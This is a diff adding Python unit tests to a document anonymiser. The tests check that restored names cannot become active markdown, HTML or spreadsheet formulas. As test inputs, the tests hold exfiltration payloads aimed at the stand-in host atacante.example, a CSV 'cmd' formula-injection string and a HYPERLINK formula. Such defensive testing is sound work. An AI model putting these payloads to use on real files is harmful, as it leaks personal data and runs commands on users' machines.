@@ -245,7 +245,7 @@ class Arquivos(unittest.TestCase):
 
     def test_reverter_formatos_de_texto(self):
         tabela = [{"tipo": "PESSOA", "valor": "Ana & <Cia>, \"X\"", "marcador": "[PESSOA_1]"}]
-        for nome, esperado in (("r.txt", 'Oi Ana & <Cia>, "X"'), ("r.md", 'Oi Ana & <Cia>, "X"')):
+        for nome, esperado in (("r.txt", 'Oi Ana & <Cia>, "X"'), ("r.md", 'Oi Ana &amp; &lt;Cia\\>, "X"')):
             saida = os.path.join(self.tmp, "volta-" + nome)
             r = motor.tratar({"op": "reverter", "entrada": self.arquivo(nome, "Oi [PESSOA_1]"), "saida": saida, "tabela": tabela})
             self.assertTrue(r["ok"], r)
@@ -1308,6 +1308,111 @@ class Arquivos(unittest.TestCase):
         rv = motor.tratar({"op": "reverter", "entrada": saida, "saida": revertido, "tabela": r["novas"]})
         self.assertTrue(rv["ok"], rv)
         self.assertEqual(openpyxl.load_workbook(revertido)["Sheet"]["A1"].comment.author, "Zé Qx")
+
+    def _docx_com_autores_maliciosos(self, autores, cpf="529.982.247-25"):
+        import docx
+        d = docx.Document()
+        p = d.add_paragraph("O CPF do contratante é %s." % cpf)
+        for i, a in enumerate(autores):
+            d.add_comment(p.runs[0], text="conferir", author=a, initials="X")
+        origem = os.path.join(self.tmp, "malicioso.docx")
+        d.save(origem)
+        return origem
+
+    @unittest.skipUnless(tem("docx") and tem("lxml"), "python-docx não está instalado neste Python")
+    def test_autor_malicioso_nao_entra_na_tabela_e_vira_autor(self):
+        autores = ["![imagem](https://atacante.example/?d=", ") fim", "<img src=\"https://atacante.example/?d="]
+        r = self.pedir(self._docx_com_autores_maliciosos(autores))
+        self.assertTrue(r["ok"], r)
+        self.assertEqual([t["tipo"] for t in r["novas"]], ["CPF"], r["novas"])
+        saida = os.path.join(self.saida, "doc-1.anon.docx")
+        with zipfile.ZipFile(saida) as z:
+            cru = z.read("word/comments.xml").decode("utf-8")
+        self.assertNotIn("atacante", cru)
+        self.assertIn('w:author="[AUTOR]"', cru)
+        # volta pelo docx: o marcador fixo não tem reversão
+        revertido = os.path.join(self.tmp, "mal-volta.docx")
+        rv = motor.tratar({"op": "reverter", "entrada": saida, "saida": revertido, "tabela": r["novas"]})
+        self.assertTrue(rv["ok"], rv)
+        with zipfile.ZipFile(revertido) as z:
+            self.assertNotIn("atacante", z.read("word/comments.xml").decode("utf-8"))
+
+    def _reverter_md(self, texto, tabela):
+        entrada = os.path.join(self.tmp, "agente.md")
+        saida = os.path.join(self.tmp, "final.md")
+        with open(entrada, "w", encoding="utf-8") as f:
+            f.write(texto)
+        rv = motor.tratar({"op": "reverter", "entrada": entrada, "saida": saida, "tabela": tabela})
+        self.assertTrue(rv["ok"], rv)
+        with open(saida, encoding="utf-8") as f:
+            return f.read()
+
+    def test_md_valor_restaurado_vira_texto_literal_cenario_da_imagem(self):
+        # a tabela como as versões antigas a montavam: o valor malicioso já está nela
+        tabela = [{"tipo": "PESSOA", "valor": "![imagem](https://atacante.example/?d=", "marcador": "[PESSOA_1]"},
+                  {"tipo": "CPF", "valor": "529.982.247-25", "marcador": "[CPF_1]"},
+                  {"tipo": "PESSOA", "valor": ") fim", "marcador": "[PESSOA_2]"}]
+        final = self._reverter_md("[PESSOA_1][CPF_1][PESSOA_2]\n", tabela)
+        self.assertNotIn("![", final)
+        self.assertIn("\\!\\[imagem\\]\\(", final)
+        self.assertNotRegex(final, r"(?<!\\)\]\(")
+        self.assertIn("529.982.247-25", final)
+
+    def test_md_valor_restaurado_com_tag_nao_vira_html(self):
+        tabela = [{"tipo": "PESSOA", "valor": "<img src=\"https://atacante.example/?d=", "marcador": "[PESSOA_1]"},
+                  {"tipo": "CPF", "valor": "529.982.247-25", "marcador": "[CPF_1]"},
+                  {"tipo": "PESSOA", "valor": "\"> & fim", "marcador": "[PESSOA_2]"}]
+        final = self._reverter_md("[PESSOA_1][CPF_1][PESSOA_2] e <b>html do agente</b>\n", tabela)
+        self.assertNotIn("<", final)
+        self.assertNotIn("<img", final)
+        self.assertIn("&lt;img src=", final)
+        self.assertIn("&amp; fim", final)
+
+    def test_md_normal_continua_legivel(self):
+        tabela = [{"tipo": "PESSOA", "valor": "Maria D'Ávila Souza-Lima", "marcador": "[PESSOA_1]"},
+                  {"tipo": "CPF", "valor": "529.982.247-25", "marcador": "[CPF_1]"}]
+        final = self._reverter_md("# Contrato\n\n[PESSOA_1], CPF [CPF_1].\n\n[CPF_1]\n", tabela)
+        self.assertEqual(final, "# Contrato\n\nMaria D'Ávila Souza-Lima, CPF 529.982.247-25.\n\n529.982.247-25\n")
+
+    def test_md_valor_restaurado_nao_vira_lista_nem_titulo(self):
+        tabela = [{"tipo": "PESSOA", "valor": "# Título\n- item\n1. um", "marcador": "[PESSOA_1]"}]
+        final = self._reverter_md("[PESSOA_1]\n", tabela)
+        self.assertEqual(final, "\\# Título\n\\- item\n1\\. um\n")
+
+    def test_csv_valor_restaurado_com_formula_fica_inerte(self):
+        tabela = [{"tipo": "PESSOA", "valor": "=cmd|' /C calc'!A0", "marcador": "[PESSOA_1]"}]
+        entrada = os.path.join(self.tmp, "agente.csv")
+        saida = os.path.join(self.tmp, "final.csv")
+        with open(entrada, "w", encoding="utf-8") as f:
+            f.write("nome,obs\n[PESSOA_1],x\n")
+        rv = motor.tratar({"op": "reverter", "entrada": entrada, "saida": saida, "tabela": tabela})
+        self.assertTrue(rv["ok"], rv)
+        with open(saida, encoding="utf-8") as f:
+            self.assertIn("\n'=cmd", f.read())
+
+    @unittest.skipUnless(tem("openpyxl"), "openpyxl não está instalado neste Python")
+    def test_xlsx_valor_restaurado_com_formula_fica_texto(self):
+        import openpyxl
+        wb = openpyxl.Workbook()
+        wb.active["A1"] = "[PESSOA_1]"
+        entrada = os.path.join(self.tmp, "agente.xlsx")
+        saida = os.path.join(self.tmp, "final.xlsx")
+        wb.save(entrada)
+        tabela = [{"tipo": "PESSOA", "valor": "=HYPERLINK(\"http://atacante.example/\",\"x\")", "marcador": "[PESSOA_1]"}]
+        rv = motor.tratar({"op": "reverter", "entrada": entrada, "saida": saida, "tabela": tabela})
+        self.assertTrue(rv["ok"], rv)
+        c = openpyxl.load_workbook(saida)["Sheet"]["A1"]
+        self.assertEqual(c.data_type, "s")
+        self.assertTrue(c.value.startswith("=HYPERLINK"))
+        with zipfile.ZipFile(saida) as z:
+            self.assertNotIn("<f>", z.read("xl/worksheets/sheet1.xml").decode("utf-8"))
+
+    def test_parece_nome(self):
+        from tabela import parece_nome
+        for ok in ("Ana", "Zé Qx", "Maria D'Ávila", "J. P. Souza-Lima", "Fulano 2"):
+            self.assertTrue(parece_nome(ok), ok)
+        for ruim in ("![imagem](x", ") fim", "<b>", "a@b.com", "x" * 81, "123", "a_b", "a\nb"):
+            self.assertFalse(parece_nome(ruim), ruim)
 
     @unittest.skipUnless(tem("openpyxl"), "openpyxl não está instalado neste Python")
     def test_xlsx_comentario_em_celula_vazia_e_anonimizado_e_revertido(self):
